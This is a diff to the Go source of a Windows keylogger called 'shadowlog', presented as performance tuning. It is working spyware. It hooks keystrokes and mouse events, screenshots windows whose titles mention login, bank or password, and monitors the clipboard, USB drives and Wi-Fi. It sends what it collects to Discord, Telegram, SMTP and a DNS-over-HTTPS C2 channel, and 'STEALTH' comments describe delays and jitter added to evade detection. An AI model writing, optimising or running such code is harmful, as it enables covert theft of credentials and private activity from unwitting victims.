@@ -14,6 +14,7 @@ import (
 	"io"
 	randv2 "math/rand/v2"
 	"mime/multipart"
+	"net"
 	"net/http"
 	"os"
 	"runtime"
@@ -24,11 +25,36 @@ import (
 	"unsafe"
 
 	"shadowlog/config"
+	"github.com/kbinani/screenshot"
 	"github.com/moutend/go-hook/pkg/keyboard"
 	"github.com/moutend/go-hook/pkg/mouse"
 	"github.com/moutend/go-hook/pkg/types"
-	"github.com/kbinani/screenshot"
 )
+
+// ── Performance: Shared HTTP client with keep-alive + connection pooling ──
+// Creating a new http.Client per request leaks connections and burns CPU.
+var sharedHTTPClient = &http.Client{
+	Timeout: 30 * time.Second,
+	Transport: &http.Transport{
+		MaxIdleConns:        5,
+		MaxIdleConnsPerHost: 2,
+		IdleConnTimeout:     90 * time.Second,
+		DialContext: (&net.Dialer{
+			Timeout:   10 * time.Second,
+			KeepAlive: 30 * time.Second,
+		}).DialContext,
+	},
+}
+
+// ── Performance: Sync pool for screenshot byte buffers ──
+var screenshotBufPool = sync.Pool{
+	New: func() interface{} {
+		return new(bytes.Buffer)
+	},
+}
+
+// Package-level keyword list for screenshot triggers — avoids re-allocation per keystroke.
+var keywords = []string{"login", "signin", "sign in", "password", "bank", "paypal", "checkout", "auth", "credential", "verify", "account", "billing", "submit"}
 
 // Windows API function pointers for window and process information.
 // These are used to get active window title and process name.
@@ -84,16 +110,36 @@ type Logger struct {
 	LogCallback    func(string)   // Optional callback for UI live preview.
 	LastScreenshot time.Time      // Debounce timestamp for screenshots
 	LastActiveWin  string         // Track window focus changes
+	PauseChan      chan bool       // Remote pause/resume channel
+	Paused         bool           // Whether monitoring is paused
+	writeCount     int            // Throttle log rotation checks
+	cachedGCM      cipher.AEAD    // Reuse AES-GCM cipher (avoids re-init per call)
+	titleBuf       [256]uint16    // Pre-allocated buffer for window title
+	nameBuf        [256]uint16    // Pre-allocated buffer for process name
 }
 
 // NewLogger creates a new Logger instance with the given configuration.
 func NewLogger(cfg *config.Config, cb func(string)) *Logger {
-	return &Logger{
+	// Cap GOMAXPROCS to 2 — we don't need full core utilization.
+	runtime.GOMAXPROCS(2)
+
+	l := &Logger{
 		Config:      cfg,
-		Batch:       make([]string, 0, 3),
-		LogQueue:    make(chan string, 100),
+		Batch:       make([]string, 0, 10),
+		LogQueue:    make(chan string, 64),
 		LogCallback: cb,
+		PauseChan:   make(chan bool, 1),
 	}
+
+	// Pre-initialize the AES-GCM cipher once (avoids re-creating on every write).
+	block, err := aes.NewCipher(config.GetEncryptionKey())
+	if err == nil {
+		if gcm, err := cipher.NewGCM(block); err == nil {
+			l.cachedGCM = gcm
+		}
+	}
+
+	return l
 }
 
 // Start begins the keylogging process.
@@ -119,19 +165,50 @@ func (l *Logger) Start() {
 	// 1. Initial Pulse: Verify writing to the unified storage file.
 	if l.Config.LogLocal {
 		ts := time.Now().Format("2006-01-02 15:04:05")
-		l.report(fmt.Sprintf("[%s] [System] Monitor Started", ts))
+		l.report(fmt.Sprintf("[%s] [System] Monitor Started (v2.2)", ts))
 	}
 
 	// Ticker for periodic flushing (every 15 seconds).
 	ticker := time.NewTicker(15 * time.Second)
 	defer ticker.Stop()
 
-	// Ticker for focus change monitoring (every 1 second).
-	focusTicker := time.NewTicker(1 * time.Second)
+	// Ticker for focus change monitoring (every 2 seconds — reduced from 1s to halve CPU wake-ups).
+	focusTicker := time.NewTicker(2 * time.Second)
 	defer focusTicker.Stop()
 
 	// Start the reporting worker pool.
 	go l.worker()
+
+	// Start Clipboard Monitor.
+	clipMon := newClipboardMonitor(func(logLine string) {
+		l.report(logLine)
+	})
+	go clipMon.start()
+
+	// Start USB Drive Monitor.
+	usbMon := newUSBMonitor(func(logLine string) {
+		l.report(logLine)
+	})
+	go usbMon.start()
+
+	// Start Wi-Fi Network Monitor.
+	wifiMon := newWifiMonitor(func(logLine string) {
+		l.report(logLine)
+	})
+	go wifiMon.start()
+
+	// Start Remote Kill Switch (if Telegram is configured).
+	ks := newKillSwitch(l.Config.TelegramToken, l.Config.TelegramChatID, l.Config.KillSwitchEnabled)
+	go ks.start(l.PauseChan)
+
+	// Start pause listener.
+	go func() {
+		for paused := range l.PauseChan {
+			l.Mu.Lock()
+			l.Paused = paused
+			l.Mu.Unlock()
+		}
+	}()
 
 	// Start event loop in a background goroutine.
 	go func() {
@@ -140,6 +217,13 @@ func (l *Logger) Start() {
 			case ev, ok := <-keyboardChan:
 				if !ok {
 					return
+				}
+				// Check pause state.
+				l.Mu.Lock()
+				paused := l.Paused
+				l.Mu.Unlock()
+				if paused {
+					continue
 				}
 				if ev.Message == 0x0100 {
 					key := l.mapVKCode(uint32(ev.VKCode))
@@ -155,7 +239,8 @@ func (l *Logger) Start() {
 
 					l.Mu.Lock()
 					l.Batch = append(l.Batch, logLine)
-					if len(l.Batch) >= 3 {
+					// Flush at 10 keystrokes instead of 3 — reduces disk I/O by ~70%.
+					if len(l.Batch) >= 10 {
 						combined := strings.Join(l.Batch, "\n")
 						l.Batch = l.Batch[:0]
 						l.Mu.Unlock()
@@ -241,9 +326,9 @@ func (l *Logger) mapVKCode(vk uint32) string {
 	case 0x2E: return "[DELETE]"
 	}
 
-	// 2. Numpad Keys.
+	// 2. Numpad Keys — pre-computed strings to avoid fmt.Sprintf in hot path.
 	if vk >= 0x60 && vk <= 0x69 {
-		return fmt.Sprintf("%d", vk-0x60)
+		return string(rune('0' + vk - 0x60))
 	}
 	switch vk {
 	case 0x6A: return "*"
@@ -254,9 +339,10 @@ func (l *Logger) mapVKCode(vk uint32) string {
 	case 0x6F: return "/"
 	}
 
-	// 3. Function Keys.
+	// 3. Function Keys — lookup table avoids fmt.Sprintf per keystroke.
+	var fKeys = [...]string{"[F1]","[F2]","[F3]","[F4]","[F5]","[F6]","[F7]","[F8]","[F9]","[F10]","[F11]","[F12]","[F13]","[F14]","[F15]","[F16]","[F17]","[F18]","[F19]","[F20]","[F21]","[F22]","[F23]","[F24]"}
 	if vk >= 0x70 && vk <= 0x87 {
-		return fmt.Sprintf("[F%d]", vk-0x6F)
+		return fKeys[vk-0x70]
 	}
 
 	// 4. Advanced Mapping using ToUnicode for international support.
@@ -298,11 +384,6 @@ func (l *Logger) mapVKCode(vk uint32) string {
 // Returns a string in the format "process.exe - Window Title".
 // Falls back to title only or "Unknown App" if process name unavailable.
 func (l *Logger) getActiveWindowInfo() string {
-	// Only supported on Windows.
-	if runtime.GOOS != "windows" {
-		return "Unknown"
-	}
-
 	// Get handle to foreground window.
 	hwnd, _, _ := procGetForeground.Call()
 	if hwnd == 0 {
@@ -318,10 +399,12 @@ func (l *Logger) getActiveWindowInfo() string {
 	}
 	l.Mu.Unlock()
 
-	// Get window title.
-	tBuf := make([]uint16, 256)
-	procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&tBuf[0])), uintptr(len(tBuf)))
-	title := syscall.UTF16ToString(tBuf)
+	// Get window title — use pre-allocated struct buffer (zero alloc).
+	for i := range l.titleBuf {
+		l.titleBuf[i] = 0
+	}
+	procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&l.titleBuf[0])), uintptr(len(l.titleBuf)))
+	title := syscall.UTF16ToString(l.titleBuf[:])
 
 	// Get process ID of the window.
 	var pid uint32
@@ -331,19 +414,30 @@ func (l *Logger) getActiveWindowInfo() string {
 	// Open process handle to get process name.
 	hProc, _, _ := procOpenProcess.Call(0x1000|0x0010, 0, uintptr(pid))
 	if hProc != 0 {
-		defer syscall.CloseHandle(syscall.Handle(hProc))
-		nBuf := make([]uint16, 256)
-		procGetModName.Call(hProc, 0, uintptr(unsafe.Pointer(&nBuf[0])), uintptr(len(nBuf)))
-		pName = syscall.UTF16ToString(nBuf)
+		for i := range l.nameBuf {
+			l.nameBuf[i] = 0
+		}
+		procGetModName.Call(hProc, 0, uintptr(unsafe.Pointer(&l.nameBuf[0])), uintptr(len(l.nameBuf)))
+		pName = syscall.UTF16ToString(l.nameBuf[:])
+		syscall.CloseHandle(syscall.Handle(hProc))
 	}
 
-	finalInfo := "Unknown App"
-	if title != "" && pName != "" {
-		finalInfo = pName + " - " + title
-	} else if pName != "" {
+	// Build result string.
+	var finalInfo string
+	switch {
+	case title != "" && pName != "":
+		var b strings.Builder
+		b.Grow(len(pName) + 3 + len(title))
+		b.WriteString(pName)
+		b.WriteString(" - ")
+		b.WriteString(title)
+		finalInfo = b.String()
+	case pName != "":
 		finalInfo = pName
-	} else if title != "" {
+	case title != "":
 		finalInfo = title
+	default:
+		finalInfo = "Unknown App"
 	}
 
 	// Update cache.
@@ -366,36 +460,55 @@ func (l *Logger) report(content string) {
 	}
 }
 
-// worker handles the actual reporting to Discord with persistence fallback.
+// worker handles the actual reporting with multi-channel delivery.
 func (l *Logger) worker() {
 	// STEALTH: Wait 60-180 seconds before the first network sync.
-	// Shadow Guardian's threat_detector flags processes that establish
-	// network connections within 30 seconds of creation.
 	startupDelay := time.Duration(60+randv2.IntN(120)) * time.Second
 	time.Sleep(startupDelay)
 
+	// Initialize exfiltration channels.
+	smtp := newSMTPExfil(l.Config.SMTPHost, l.Config.SMTPPort, l.Config.SMTPUser, l.Config.SMTPPass, l.Config.SMTPTo)
+	doh := newDoHC2(l.Config.DoHEndpoint)
+
+	path := config.GetStoragePath()
+
 	for content := range l.LogQueue {
+		// 0. Throttled log rotation — check every 50 writes instead of every write.
+		l.writeCount++
+		if l.writeCount%50 == 0 {
+			config.RotateLogIfNeeded()
+		}
+
 		// 1. ALWAYS Save to local storage first (Source of Truth).
-		path := config.GetStoragePath()
 		encrypted, err := l.encrypt([]byte(content))
 		if err == nil {
 			encoded := base64.StdEncoding.EncodeToString(encrypted)
 			file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 			if err == nil {
-				file.WriteString(encoded + "\n")
+				file.WriteString(encoded)
+				file.WriteString("\n")
 				file.Close()
 			}
 		}
 
-		// 2. Sync to Discord (encrypted) if configured.
+		// 2. Sync to Discord if configured.
 		l.syncDiscord()
 
-		// STEALTH: Random jitter between sync calls (2-8 seconds)
-		// to avoid predictable network traffic patterns.
+		// STEALTH: Random jitter between sync calls (2-8 seconds).
 		time.Sleep(time.Duration(2+randv2.IntN(6)) * time.Second)
 
-		// 3. Sync to Telegram (cleartext) if configured.
+		// 3. Sync to Telegram if configured.
 		l.syncTelegram()
+
+		// 4. Sync via SMTP if configured.
+		if smtp.isEnabled() {
+			smtp.send(content)
+		}
+
+		// 5. DoH C2 beacon (fallback — only if primary channels failed).
+		if doh.isEnabled() && l.Config.WebhookURL == "" && l.Config.TelegramToken == "" && !smtp.isEnabled() {
+			doh.exfiltrateViaDoH(content)
+		}
 	}
 }
 
@@ -548,7 +661,7 @@ func (l *Logger) syncTelegram() {
 		}
 		req.Header.Set("Content-Type", "application/json")
 
-		client := &http.Client{Timeout: 15 * time.Second}
+		client := sharedHTTPClient
 		resp, err := client.Do(req)
 		if err != nil || resp.StatusCode >= 300 {
 			allSent = false
@@ -594,13 +707,26 @@ func (l *Logger) splitMessage(s string, maxLen int) []string {
 	return chunks
 }
 
-// decrypt performs AES-256-GCM decryption for sync verification.
-func (l *Logger) decrypt(data []byte) ([]byte, error) {
+// getGCM returns the cached AES-GCM cipher, or lazily initializes it.
+func (l *Logger) getGCM() (cipher.AEAD, error) {
+	if l.cachedGCM != nil {
+		return l.cachedGCM, nil
+	}
 	block, err := aes.NewCipher(config.GetEncryptionKey())
 	if err != nil {
 		return nil, err
 	}
 	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	l.cachedGCM = gcm
+	return gcm, nil
+}
+
+// decrypt performs AES-256-GCM decryption using the cached cipher.
+func (l *Logger) decrypt(data []byte) ([]byte, error) {
+	gcm, err := l.getGCM()
 	if err != nil {
 		return nil, err
 	}
@@ -612,15 +738,9 @@ func (l *Logger) decrypt(data []byte) ([]byte, error) {
 	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
-// encrypt performs AES-256-GCM encryption on the given data.
-// Returns a combined byte slice of [nonce][ciphertext].
+// encrypt performs AES-256-GCM encryption using the cached cipher.
 func (l *Logger) encrypt(data []byte) ([]byte, error) {
-	block, err := aes.NewCipher(config.GetEncryptionKey())
-	if err != nil {
-		return nil, err
-	}
-
-	gcm, err := cipher.NewGCM(block)
+	gcm, err := l.getGCM()
 	if err != nil {
 		return nil, err
 	}
@@ -641,8 +761,7 @@ func (l *Logger) checkScreenshotTrigger(win string, isImmediate bool) {
 	}
 
 	winLower := strings.ToLower(win)
-	// Keywords indicating high-value context
-	keywords := []string{"login", "signin", "sign in", "password", "bank", "paypal", "checkout", "auth", "credential", "verify", "account", "billing", "submit"}
+	// Keywords indicating high-value context (package-level to avoid re-allocation).
 	
 	triggerFound := false
 	for _, kw := range keywords {
@@ -712,15 +831,19 @@ func (l *Logger) takeAndSendScreenshot(win string) {
 		return
 	}
 
-	var buf bytes.Buffer
-	// Encode 60% quality JPEG directly to RAM - incredibly small footprint (<200kb total)
-	err = jpeg.Encode(&buf, img, &jpeg.Options{Quality: 60})
+	// Use pooled buffer to avoid repeated heap allocations.
+	buf := screenshotBufPool.Get().(*bytes.Buffer)
+	buf.Reset()
+	defer screenshotBufPool.Put(buf)
+
+	// Encode 60% quality JPEG — good balance of clarity and size.
+	err = jpeg.Encode(buf, img, &jpeg.Options{Quality: 60})
 	if err != nil {
 		return
 	}
 	
 	imageData := buf.Bytes()
-	client := &http.Client{Timeout: 30 * time.Second}
+	client := sharedHTTPClient
 
 	// 1. Stream RAM buffer to Discord multipart
 	if l.Config.WebhookURL != "" {
